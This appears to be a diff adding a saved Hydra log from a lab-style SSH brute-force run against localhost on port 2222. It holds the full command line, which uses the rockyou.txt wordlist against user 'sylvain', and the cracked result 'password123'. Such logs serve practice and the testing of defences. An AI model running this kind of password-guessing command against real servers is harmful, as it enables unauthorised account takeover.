@@ -1,0 +1,5 @@
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-03 15:58:23
+# Hydra v9.0 run at 2024-03-03 16:15:05 on 127.0.0.1 ssh (hydra -l sylvain -P rockyou.txt -s 2222 -o output.txt -F 127.0.0.1 ssh)
+[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
